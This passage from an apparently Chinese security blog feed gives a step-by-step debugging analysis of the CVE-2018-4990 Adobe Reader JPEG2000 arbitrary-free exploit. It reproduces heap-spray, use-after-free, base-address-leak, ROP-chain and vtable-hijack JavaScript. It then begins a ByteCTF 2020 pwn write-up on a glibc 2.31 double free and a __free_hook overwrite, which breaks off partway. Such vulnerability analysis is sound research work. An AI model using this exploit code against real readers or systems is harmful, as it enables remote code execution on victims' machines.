alt="image-20200703103610816"></p><p>这里看到分配了两个空间大小，分配空间的函数是<code>sub10066EFD</code>，该函数有两个参数，第一个参数是空间的大小。首先是第一个分配，可以看到空间大小的参数来自于<code>ebx</code>，<code>ebx</code>的数值来源于<code>ecx/4</code>，向上回溯可以看到<code>ecx</code>的值来自于<code>ebp-0x10</code>位置的值，大小为<code>0x3f4</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104202688.png" alt="image-20200703104202688"></p><p>即最终调用<code>10066EFD(0xfd, 4)</code>，返回的内存大小是</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104409984.png" alt="image-20200703104409984"></p><p>随后将分配的内存地址保存在<code>ebp-0x8</code>的位置，接下来分配了<code>0x20</code>大小的内存空间，将地址保存在了<code>base+0x48</code>的位置，对<code>*(base+0x48)+0xc</code>的位置下内存断点，可以找到内存分配的位置</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104901273.png" alt="image-20200703104901273"></p><p>我们可以看到该位置的内存就是保存在<code>ebp-0x8</code>位置的内存地址</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703105035059.png" alt="image-20200703105035059"></p><p>那么<code>0x3f4</code>是怎么来的呢，我们继续向上回溯，发现该值来自于<code>ebp-0x14</code>与<code>ebp-0x4</code>之间的差值</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703110256510.png" alt="image-20200703110256510"></p><p>而两个位置的变量的值来自于函数<code>3FD93</code>，我们看一下函数</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703110548086.png" alt="image-20200703110548086"></p><p><code>a1</code>也就是<code>ebp-0x14</code>处的值来自于函数<code>1000B31B</code>，<code>a3=8</code>或者<code>a3=16</code>，最终调试之后发现<code>a3=8</code>。我们看一下函数<code>1000B21A</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703111352191.png" alt="image-20200703111352191"></p><p>可以看到返回值来自于<code>esi+0x10</code>的取值。在调用函数<code>40DF0</code>处下断点，之后在<code>1003FDB2</code>处下断点，这个时候调用<code>B31B</code>函数就会返回<code>0x3fc</code>，我们跟进调试一下。<code>B31B</code>函数根据传递的参数决定读取的字节数(4)，将所有的数值相加即得到最终的返回结果。从<code>B21A</code>函数的反汇编代码来看，函数的返回值主要是读取的<code>*(*(esi+0x10))</code>处存储的一个字节的值。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703125544101.png" alt="image-20200703125544101"></p><p>从多次调试的结果来看，<code>esi</code>指向的是一个<code>JP2k</code>的对象，偏移<code>0xc</code>的位置存储了图片文件数据的起始地址，偏移<code>0x10</code>的位置存储了当前读取的位置，偏移<code>0x14</code>存储了文件结束的位置，偏移<code>0x1c</code>处存储了已经读取的数据的大小。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703125847368.png" alt="image-20200703125847368"></p><p>最终读取了文件偏移<code>0x2a-0x2d</code>处的四字节。那么最终申请的内存空间的大小即<code>0x3fc-0x8=0x3f4</code>。</p><p>接下来看一下<code>0xff</code>是怎么获取的。在<code>*(base+0x48)+0xc</code>处下内存断点，找到赋值的代码段。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703132145988.png" alt="image-20200703132145988"></p><p>我们可以看到<code>0xff</code>的数值来自于<code>esi+0x18</code>处存储的一个字节，从上面对于<code>B21A</code>函数的分析来看，<code>esi+0x18</code>处存储的数据是<code>*(*(esi+0x10))</code>处的数据，也就是<code>JP2K</code>文件中的数据。这里推测是由于<code>pclr</code>之后应该仍然存在数据，强行截断之后造成越界读取。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703132715866.png" alt="image-20200703132715866"></p><p>到这里就知道了造成越界释放两个内存指针的数据<code>0x3f4,0xff</code>均来自于攻击者精心构造的恶意数据。</p><p>这里需要注意的是PdfStreamDumper好像无法观察到JP2K图片的二进制数据。</p><h4 id="重用已经释放的内存"><a href="#重用已经释放的内存" class="headerlink" title="重用已经释放的内存"></a>重用已经释放的内存</h4><p>我们在内存释放的位置下断点</p><p>断点断在越界访问释放内存的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu JPKLIB+5056E</span><br></pre></td></tr></table></figure><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629143253608.png" alt="image-20200629143253608"></p><p>此时两个堆块都处于占用状态，每一个堆块的大小为<code>0x2000*8=0x10000</code>（该堆段的分配粒度为8bytes，<code>!heap 440000 -v</code>），接下来释放第一个堆块<code>0x0d0e0048</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629144257889.png" alt="image-20200629144257889"></p><p>释放第二个堆块<code>0x0d0f0048</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629144417026.png" alt="image-20200629144417026"></p><p>我们发现两个堆块发生了合并，合并后的大小为<code>0x20000</code>。在<code>fun1</code>函数中<code>0x200</code>数组的申请可能是为了消耗内存使得脚本申请的内存空间落在a1数组中。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f1 = <span class="variable language_">this</span>.<span class="title function_">getField</span>(<span class="string">&quot;Button1&quot;</span>);<span class="comment">//导致任意地址释放的漏洞触发脚本</span></span><br></pre></td></tr></table></figure><blockquote><p>这里其实我们可以发现分配给eax的内存恰好是a1中存在的某个hole (重启调试，分配的内存值改变0x7bcda10)</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701230052084.png" alt="image-20200701230052084"></p></blockquote><p>通过下面的代码将上述<code>0x20000</code>的堆块进行重用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;<span class="number">0x40</span>;i1++)</span><br><span class="line">&#123;</span><br><span class="line">    sprayarr2[i1] = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20000</span>-<span class="number">24</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701231405675.png" alt="image-20200701231405675"></p><p>看到<code>sprayarr</code>数组的第一个元素就重用了堆块。这里之所以是<code>0x0d0e0058</code>,是因为其要减去<code>0x10</code>的<code>Buffer</code>头，再减去<code>0x8</code>的HeapEntry。此时释放前<code>0x0d0e0048,0d0f0048</code>分别代表一个长度为<code>0x1000-24</code>大小的<code>ArrayBuffer</code>，在UAF之后变成了一个代表长度为<code>0x20000-24</code>大小的<code>ArrayBuffer</code>。从代码中可以得到此时<code>sprayaar</code>数组中的某一个<code>ArrayBuffer</code>（0x0d0e0048）已经被修改为了<code>0x2000-24</code>，长度改变之后就可以通过该<code>ArrayBuffer</code>越界访问修改临近的<code>ArrayBuffer</code>（0x0d0f0048）的长度为<code>0x66666666</code>，实现全局内存的读写。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629151809292.png" alt="image-20200629151809292"></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701220044712.png" alt="image-20200701220044712"></p><h4 id="泄露Escript-api基址"><a href="#泄露Escript-api基址" class="headerlink" title="泄露Escript.api基址"></a>泄露Escript.api基址</h4><p>接下来我们观察一下后续代码的执行。我们对viewContent中的设置如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">viewContent[<span class="number">0</span>] = <span class="number">0x12345678</span>;</span><br><span class="line">viewContent[<span class="number">1</span>] = sprayarr;</span><br><span class="line">viewContent[<span class="number">2</span>] = a1;</span><br><span class="line">viewContent[<span class="number">3</span>] = sprayarr2;</span><br><span class="line">viewContent[<span class="number">4</span>] = sprayarr2;</span><br><span class="line">viewContent[<span class="number">5</span>] = i1;</span><br><span class="line">viewContent[<span class="number">6</span>] = arr1;</span><br><span class="line">viewContent[<span class="number">7</span>] = i2;</span><br><span class="line">viewContent[<span class="number">8</span>] = itmp;</span><br></pre></td></tr></table></figure><p>内存中的值如下</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702155847408.png" alt="image-20200702155847408"></p><p>在获得全局读写能力之后，攻击者尝试获取动态链接库的地址，我们看一下地址的获取过程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0x10</span>;i2&lt;<span class="number">0x10000</span>;i2++)</span><br><span class="line">    arr1[i2] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2 = <span class="number">1</span>;i2&lt;<span class="number">0x10</span>;i2++)</span><br><span class="line">&#123;</span><br><span class="line">    arr1[i2] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(sprayarr[i1+i2]);</span><br><span class="line">    arr1[i2][<span class="number">0</span>] = i2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0x30000</span>;i2&lt;<span class="number">0x10000</span>*<span class="number">0x10</span>;i2=i2+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( biga.<span class="title function_">getUint32</span>(i2,<span class="literal">true</span>)==spraylen &amp;&amp; biga.<span class="title function_">getUint32</span>(i2+<span class="number">4</span>,<span class="literal">true</span>) &gt; spraypos  )</span><br><span class="line">    &#123;</span><br><span class="line">        mydv = biga;</span><br><span class="line">        <span class="keyword">var</span> itmp = mydv.<span class="title function_">getUint32</span>(i2+<span class="number">12</span>,<span class="literal">true</span>);</span><br><span class="line">        myarray = arr1[itmp];</span><br><span class="line">        mypos = biga.<span class="title function_">getUint32</span>(i2+<span class="number">4</span>,<span class="literal">true</span>) - spraypos +<span class="number">0x50</span>;</span><br><span class="line">        mydv.<span class="title function_">setUint32</span>(mypos-<span class="number">0x10</span>,<span class="number">0x100000</span>,<span class="literal">true</span>);</span><br><span class="line">        myarraybase = mydv.<span class="title function_">getUint32</span>(mypos,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> rop1 = [<span class="number">0x6b78845b</span>,<span class="number">0x6b78845b</span>,<span class="number">0x6b78845a</span>,<span class="number">0x6b7d7084</span>,<span class="number">0x6b651767</span>,<span class="number">0x6b64230d</span>,myarraybase,<span class="number">0x6b65ecaf</span>,<span class="number">0x6b663a4b</span>,myarraybase,<span class="number">0x00010201</span>,<span class="number">0x00001000</span>,<span class="number">0x00000040</span>,<span class="number">0xcccccccc</span>,<span class="number">0x41414141</span>];</span><br><span class="line">        <span class="keyword">var</span> obj1 = <span class="title function_">myread</span>(myarraybase-<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">var</span> obj2 = <span class="title function_">myread</span>(obj1+<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> obj3 = <span class="title function_">myread</span>(obj2);</span><br><span class="line">        <span class="keyword">var</span> dll_base = (<span class="title function_">myread</span>(obj3+<span class="number">8</span>)-<span class="number">0x00010000</span> )&amp;<span class="number">0xffff0000</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，创建了一个<code>arr1</code>的<code>Array</code>对象，将<code>sprayarr[i]</code>之后的内存块创建<code>Unit32Array</code>对象，设置第一个元素为索引值。这里的<code>i1</code>就是<code>sprayarr</code>中<code>0x0d0f0048</code>的索引值。从<code>0d0f0058</code>开始偏移<code>0x30000</code>的内存地址开始查找两个值，这里其实就是从<code>sprayarr[i+3]</code>的位置开始查找，最终查找到的偏移值是<code>0x3fff4</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702164953395.png" alt="image-20200702164953395"></p><p>发现最终符合要求的是<code>0d0f0048</code>之后的低四个堆块，由于是一个<code>Unit32Array.buffer</code>结构，因此我们可以得到一个指向<code>Unit32Array</code>结构的指针。<code> mydv.setUint32</code>最终修改的是<code>biga.getUint32(i2+4,true) - spraypos +0x50 - 0x10 + mydv.base = 0x1ac97138 - 0x0d0f0058 + 0x50 - 0x10 + 0x0d0f0058</code>即<code>Unit32Array</code>偏移<code>0x40</code>位置的值（表示空间大小的变量），可以看到这里已经被改为了<code>0x10000</code>。将<code>Unit32Array.buffer</code>的指针赋值给<code>myarraybase</code>。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702170721837.png" alt="image-20200702170721837"></p><p>从<code>ida</code>中我们可以得知<code>0x65a83f5c</code>是全局变量存储的位置，该位置存储了一些函数指针（推测应该是结构体相关的方法函数指针），通过这些函数指针即可以推算出<code>Escript.api</code>的加载基址。这里通过分析，我们可以得知<code>Unit32Array</code>数据结构中的前8字节存储的两个指针，第一个指针指向的是其上一层的数据结构（以a1为例，即Array数据结构）的虚函数表，第二个函数指针则指向该结构的虚函数表。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702173246575.png" alt="image-20200702173246575"></p><h4 id="劫持程序流，ROP执行载荷"><a href="#劫持程序流，ROP执行载荷" class="headerlink" title="劫持程序流，ROP执行载荷"></a>劫持程序流，ROP执行载荷</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bkm = <span class="variable language_">this</span>.<span class="property">bookmarkRoot</span>;</span><br><span class="line"><span class="keyword">var</span> objescript = <span class="number">0x23A59BA4</span>-<span class="number">0x23800000</span> + dll_base;</span><br><span class="line">objescript = <span class="title function_">myread</span>(objescript); <span class="comment">//获取0x23A59BA4处的全局变量值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0</span>;i2&lt; rop1.<span class="property">length</span> ;i2=i2+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myarray[i2+<span class="number">3</span>] = rop1[i2] &gt;  <span class="number">0x6b640000</span> ?(rop1[i2] - <span class="number">0x6b640000</span> +dll_base):rop1[i2];</span><br><span class="line">&#125;</span><br><span class="line">myarray[i2+<span class="number">3</span>-<span class="number">2</span>] = <span class="number">0x90909090</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i3=<span class="number">0</span>;i3&lt; dlldata.<span class="property">length</span> ;i3=i3+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myarray[i2+<span class="number">3</span>+i3] = dlldata[i3];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">mywrite</span>(objescript, <span class="number">0x6b707d06</span>-<span class="number">0x6b640000</span>+dll_base); </span><br><span class="line"><span class="title function_">mywrite</span>(objescript+<span class="number">4</span>,myarraybase);</span><br><span class="line"><span class="title function_">mywrite</span>(objescript+<span class="number">0x598</span>,<span class="number">0x6b68389f</span>-<span class="number">0x6b640000</span>+dll_base);</span><br><span class="line">bkm.<span class="title function_">execute</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>myarray</code>的值是<code>0x0d0f0058</code>。也就是攻击者将<code>rop</code>和载荷写入到了<code>0d0f0058</code>内存空间中，<code>rop</code>和载荷之间存在着滑板指令。攻击者更改了虚函数表中的内容（这里通过截断初始代码构造出pop esp）</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702181930219.png" alt="image-20200702181930219"></p><p><code>0x6b68389f-0x6b640000+dll_base</code>代码内容为（这里重启调试，基址改变69de0000 ）</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702183636563.png" alt="image-20200702183636563"></p><p>我们在<code>rop</code>的第一条指令，<code>0x6b707d06-0x6b640000+dll_base</code>和<code>0x6b68389f-0x6b640000+dll_base</code>分别下断点。对<code>objescript</code>指向的内存位置下内存访问断点。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702184608976.png" alt="image-20200702184608976"></p><p>函数断在了<code>objescript+0x598</code>的代码调用处，也就是在执行的之后对象会调用虚函数表中偏移<code>0x598</code>位置的函数。注意到这里的<code>eax</code>值即为<code>objescript</code>的值。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702202911620.png" alt="image-20200702202911620"></p><p>在<code>IDA</code>中查看<code>69e325d3</code>部分的代码</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203042296.png" alt="image-20200702203042296"></p><p>发生调用的是一个间接调用，我们对返回值<code>69e325d3</code>下断点</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203129530.png" alt="image-20200702203129530"></p><p>发现其真正调用的函数是<code>69e6eed4</code>，我们看一下这个函数，在该函数中我们发现了明显的劫持程序流的代码部分</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203254745.png" alt="image-20200702203254745"></p><p>首先将虚表指针赋值到eax中，接着调用偏移<code>0x598</code>处的函数，也就劫持了程序流。寄存器交换之后即可以重定向程序流到代码<code>0x6b707d06-0x6b640000+dll_base</code>位置，代码中仍然存在<code>pop esp</code>进一步改变程序流到<code>ROP</code>的第二个指令<code>0x6b78845b,0x6b78845a...</code>最终执行载荷。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>漏洞触发和利用的流程如下</p><ol><li>通过两个<code>Array</code>对象<code>a1</code>和<code>sprayarr</code>创建大量的<code>Unit32Array</code>（buffer大小为0x3f0，堆块可用空间0x400）和<code>ArrayBuffer</code>（buffer大小为0xffe8,堆块可用空间0xfff8）对象，将<code>Unit32Array</code>中的<code>249</code>和<code>250</code>中的元素设置为选定的内存地址(这里攻击者选定的是<code>0x0d0e0048,0x0d0f0048</code>)。</li><li>对<code>a1</code>中的<code>Unit32Array</code>进行间隔释放，造成内存空洞，便于之后对<code>JP2K</code>文件解析时申请的内存落到<code>a1</code>数组范围中。</li><li>调用漏洞触发脚本，通过加载特定的<code>JP2K</code>图片，特定的大小使得分配的内存（大小为<code>0x3f4</code>）落到之前<code>a1</code>释放的某一个<code>Unit32Array.buffer</code>的内存空间中，而0xff使得函数越界释放两个内存指针。这两个内存指针是<code>a1</code>中提前布局好的位于偏移<code>0x3f4,0x3f8</code>位置的脏数据（<code>0x0d0e0040,0d0f0048</code>指针）。两个堆块释放之后合并，堆块大小为<code>0x20000</code>，可用空间<code>0x1fff8</code>。注意到此时<code>sprayarr</code>数组中仍然存在指向<code>0x0d0e0040,0d0f0048</code>内存空间的指针</li><li>通过<code>sprayarr2</code>数组分配<code>0x20000</code>大小的堆块（<code>ArrayBuffer</code>），对上述合并的堆块进行重用。一旦分配成功<code>sprayarr</code>中<code>0d0e0048</code>的<code>ArrayBuffer.buffer</code>中长度就会被改为<code>0x1ffe8</code>，此时既可以通过该<code>buffer</code>访问<code>0d0e0058-0d100040</code>。通过对该常长的<code>buffer</code>修改临近的堆块<code>0d0f0048</code>中的长度为<code>0x66666666</code>，此时即可通过<code>0d0f0048</code>表示的<code>ArrayBuffer.buffer</code>访问全局内存。</li><li>由于<code>Unit32Array.buffer</code>结构体中存在指向父结构<code>Unit32Array</code>的指针，且<code>Unit32Array</code>等结构体中存在指向相关虚函数表的内存指针，因此将<code>sprayarr</code>中<code>0d0f0048</code>之后的<code>buffer</code>重新定义为<code>Unit32Array</code>结构体，找到相关的虚函数表泄露<code>Escript.api</code>库的基址</li><li>伪造<code>bookMarkRoot</code>对象，覆盖<code>execute</code>中执行的某个虚表指针为<code>ROP</code>地址(<code>xchg eax,ebp</code>)，对选自<code>Escript.api</code>库中的<code>ROP</code>地址进行重定位，将<code>ROP</code>和载荷写入到已知地址的地址空间中，通过两次<code>ebp</code>更改执行流，最终执行ROP和载荷。</li></ol><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>攻击者为什么可以确定堆喷之后<code>0d0e0048</code>就是一个<code>ArrayBuffer.buffer</code>的起始位置。申请如此巨大的内存的时候，堆管理器一定会<code>commit</code>一块大的堆段，堆段的起始位置的后四位一定为<code>0</code>，而堆段需要一个<code>0x40</code>大小的<code>HEAP_SEGMENT</code>结构进行管理，因此分配的堆块的起始地址为<code>xxxx0040</code>，<code>ArrayBuffer.buffer</code>申请的大小为<code>0x10000-24</code>，但是实际分配的堆块的大小为<code>0x10000</code>字节，因此后续分配的堆块都将遵循<code>xxxx0040</code>的格式，选择其中相邻的两个即可。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703170403386.png" alt="image-20200703170403386"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/188138">PDF调试技巧剖析</a></p><p><a href="https://bbs.pediy.com/thread-250670.htm">Windbg新手入坑指南 </a></p><p><a href="https://bbs.pediy.com/thread-226971.htm">CVE-2018-4990 Acrobat Reader堆内存越界访问释放漏洞分析</a></p><p><a href="https://bbs.pediy.com/thread-250449.htm">对CVE-2018-4990漏洞的补充分析</a></p><p><a href="https://www.freebuf.com/articles/system/201205.html">CVE-2018-4990漏洞调试分析记录</a></p><p><a href="https://www.anquanke.com/post/id/146208">CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</a></p><p><a href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html">Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 ByteCTF 部分PWN WriteUp</title>
      <link href="/posts/1545760913.html"/>
      <url>/posts/1545760913.html</url>
      
        <content type="html"><![CDATA[<h2 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h2><p><code>GLIBC 2.31</code></p><p>程序实现了三个功能<code>add,load,delete</code>，其中<code>add</code>只能分配<code>0x500</code>一下的堆块，总共分配的堆块大小不超过<code>0x1000</code>，分配的基本单位是一个<code>node</code>，第一个值是<code>buf</code>，第二个值表示<code>next_chunk</code>，第三个值是<code>flag</code>。<code>load</code>是创建了一个全局的单项链表，通过<code>node-&gt;next_chunk</code>也就是<code>+0x10</code>的位置进行串联。在<code>delete</code>的时候未清空<code>next_chunk</code>的指针。通过<code>delete,load,delete</code>可以制造<code>double free</code>漏洞，并且在第二次<code>delete</code>的时候会泄露出地址。</p><p>但是由于<code>2.31</code>对<code>tcache double free</code>进行了检查，这个题目没有办法进行修改其<code>keys</code>，因此采用<code>fastbin attack</code>的方法来做。覆写<code>__free_hook</code>为<code>magic gadget</code>的值，该<code>gadget</code>的作用是将<code>rdi</code>转移到<code>rdx</code>中，并调用<code>setcontext</code>，我们找到下面的<code>gadget</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 